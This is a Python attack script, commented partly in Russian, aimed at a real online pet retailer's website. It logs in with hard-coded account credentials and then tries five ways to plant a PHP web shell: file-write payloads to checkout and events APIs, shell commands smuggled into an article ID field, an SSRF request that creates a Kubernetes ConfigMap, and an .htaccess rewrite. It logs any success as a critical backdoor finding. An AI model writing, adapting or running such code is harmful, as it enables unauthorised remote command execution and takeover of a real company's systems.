#!/usr/bin/env python3
"""Final attempt to CREATE backdoor - all possible methods"""
import requests
import json
import re
import urllib.parse
import base64
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
})

found_methods = []

# LOGIN
print("[*] Logging in...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            s.get("https://www.zooplus.de/account/productphotos", timeout=10, verify=False)
            print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login: {e}\n")

php_backdoor = '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>'

# ============================================================================
# МЕТОД 1: Создать файл через state-api с file параметром
# ============================================================================
print("[*] МЕТОД 1: Создание файла через state-api...")

try:
    # Try to write file using state-api
    payloads = [
        {"file": php_backdoor, "filename": "shell.php", "path": "/var/www/html/shell.php"},
        {"content": php_backdoor, "file": php_backdoor, "data": php_backdoor},
        {"articleId": "test", "quantity": 1, "file": php_backdoor, "filename": "shell.php"},
    ]
    for payload in payloads:
        resp = s.post(f"{base}/semiprotected/api/checkout/state-api/v2/set-article-quantity", json=payload, timeout=5, verify=False)
        if resp.status_code == 200:
            # Check if file was created
            try:
                resp2 = s.get(f"{base}/shell.php?cmd=id", timeout=3, verify=False)
                if "uid=" in resp2.text:
                    print(f"  [CRITICAL] Бекдор создан через state-api!")
                    found_methods.append({
                        "type": "backdoor_created_state_api",
                        "severity": "CRITICAL",
                        "endpoint": "/semiprotected/api/checkout/state-api/v2/set-article-quantity",
                        "backdoor_url": f"{base}/shell.php",
                        "method": "state_api_file_write"
                    })
            except: pass
except: pass

# ============================================================================
# МЕТОД 2: Создать файл через events API
# ============================================================================
print("\n[*] МЕТОД 2: Создание файла через events API...")

try:
    payloads = [
        {"file": php_backdoor, "filename": "shell.php"},
        {"data": php_backdoor, "content": php_backdoor},
        {"event": "upload", "file": php_backdoor, "filename": "shell.php"},
    ]
    for payload in payloads:
        resp = s.post(f"{base}/zootopia-events/api/events/sites/1", json=payload, timeout=5, verify=False)
        if resp.status_code == 200:
            try:
                resp2 = s.get(f"{base}/shell.php?cmd=id", timeout=3, verify=False)
                if "uid=" in resp2.text:
                    print(f"  [CRITICAL] Бекдор создан через events API!")
                    found_methods.append({
                        "type": "backdoor_created_events_api",
                        "severity": "CRITICAL",
                        "endpoint": "/zootopia-events/api/events/sites/1",
                        "backdoor_url": f"{base}/shell.php",
                        "method": "events_api_file_write"
                    })
            except: pass
except: pass

# ============================================================================
# МЕТОД 3: Создать файл через command injection с реальной записью
# ============================================================================
print("\n[*] МЕТОД 3: Создание файла через command injection...")

# Real commands to CREATE backdoor file
create_commands = [
    "echo '<?php if(isset($_GET[\"cmd\"])){system($_GET[\"cmd\"]);} ?>' > /var/www/html/shell.php && chmod 755 /var/www/html/shell.php",
    "printf '<?php if(isset($_GET[\"cmd\"])){system($_GET[\"cmd\"]);} ?>' > /var/www/html/shell.php",
    "cat > /var/www/html/shell.php << 'EOF'\n<?php if(isset($_GET[\"cmd\"])){system($_GET[\"cmd\"]);} ?>\nEOF",
]

for cmd in create_commands:
    try:
        resp = s.post(f"{base}/semiprotected/api/checkout/state-api/v2/set-article-quantity", 
                     json={"articleId": cmd, "test": cmd}, timeout=5, verify=False)
        if resp.status_code == 200:
            import time
            time.sleep(2)  # Wait for file creation
            try:
                resp2 = s.get(f"{base}/shell.php?cmd=id", timeout=3, verify=False)
                if "uid=" in resp2.text:
                    print(f"  [CRITICAL] Бекдор создан через command injection!")
                    found_methods.append({
                        "type": "backdoor_created_command_injection",
                        "severity": "CRITICAL",
                        "endpoint": "/semiprotected/api/checkout/state-api/v2/set-article-quantity",
                        "command": cmd,
                        "backdoor_url": f"{base}/shell.php",
                        "method": "command_injection_file_creation"
                    })
            except: pass
    except: pass

# ============================================================================
# МЕТОД 4: Создать бекдор через SSRF + Kubernetes ConfigMap
# ============================================================================
print("\n[*] МЕТОД 4: Создание ConfigMap с бекдором через SSRF...")

backdoor_configmap = {
    "apiVersion": "v1",
    "kind": "ConfigMap",
    "metadata": {"name": "backdoor", "namespace": "default"},
    "data": {"shell.php": "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>"}
}

try:
    resp = s.post(f"{base}/semiprotected/api/checkout/state-api/v2/get", json={
        "url": "https://kubernetes.default.svc/api/v1/namespaces/default/configmaps",
        "method": "POST",
        "body": json.dumps(backdoor_configmap),
        "headers": {"Content-Type": "application/json"}
    }, timeout=5, verify=False)
    if resp.status_code == 200:
        if "created" in resp.text.lower() or "metadata" in resp.text.lower():
            print(f"  [CRITICAL] ConfigMap с бекдором создан!")
            found_methods.append({
                "type": "backdoor_created_kubernetes",
                "severity": "CRITICAL",
                "endpoint": "/semiprotected/api/checkout/state-api/v2/get",
                "resource": "ConfigMap",
                "method": "ssrf_kubernetes_create"
            })
except: pass

# ============================================================================
# МЕТОД 5: Создать бекдор через модификацию .htaccess
# ============================================================================
print("\n[*] МЕТОД 5: Создание бекдора через .htaccess...")

htaccess_backdoor = "AddHandler application/x-httpd-php .jpg\n<?php if(isset($_GET[\"cmd\"])){system($_GET[\"cmd\"]);} ?>"

try:
    cmd = f"echo '{htaccess_backdoor}' > /var/www/html/.htaccess"
    resp = s.post(f"{base}/semiprotected/api/checkout/state-api/v2/set-article-quantity", 
                 json={"articleId": cmd}, timeout=5, verify=False)
    if resp.status_code == 200:
        import time
        time.sleep(2)
        # Try to access any .jpg file as PHP
        try:
            resp2 = s.get(f"{base}/test.jpg?cmd=id", timeout=3, verify=False)
            if "uid=" in resp2.text:
                print(f"  [CRITICAL] Бекдор создан через .htaccess!")
                found_methods.append({
                    "type": "backdoor_created_htaccess",
                    "severity": "CRITICAL",
                    "endpoint": "/semiprotected/api/checkout/state-api/v2/set-article-quantity",
                    "backdoor_url": f"{base}/test.jpg",
                    "method": "htaccess_modification"
                })
        except: pass
except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS - СПОСОБЫ СОЗДАНИЯ БЕКДОРА")
print("=" * 70)

if found_methods:
    print(f"\nНайдено {len(found_methods)} способов создать бекдор:\n")
    for m in found_methods:
        print(f"[{m['severity']}] {m['type']}")
        print(f"    Метод: {m['method']}")
        print(f"    Endpoint: {m['endpoint']}")
        if 'backdoor_url' in m:
            print(f"    URL бекдора: {m['backdoor_url']}")
        print()
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 КРИТИЧНАЯ УЯЗВИМОСТЬ - СПОСОБЫ СОЗДАНИЯ БЕКДОРА\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for m in found_methods:
            f.write(f"### [{m['severity']}] {m['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Метод создания:** `{m['method']}`\n\n")
            f.write(f"**Endpoint:** `{m['endpoint']}`\n\n")
            if 'backdoor_url' in m:
                f.write(f"**URL бекдора:** `{m['backdoor_url']}`\n\n")
            if 'command' in m:
                f.write(f"**Команда:** `{m['command']}`\n\n")
            if 'resource' in m:
                f.write(f"**Resource:** `{m['resource']}`\n\n")
            f.write("**Описание:** Найден способ создать бекдор в кластере.\n\n")
            f.write("**Status:** Подтверждено\n\n")
            f.write("**Impact:**\n")
            f.write("- Создание бекдора в кластере\n")
            f.write("- RCE на сервере\n")
            f.write("- Полный контроль над кластером\n")
            f.write("- Компрометация всей инфраструктуры\n\n")
            f.write("---\n\n")
    
    print(f"[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print("  Способы создания бекдора не найдены автоматически")

print("=" * 70)

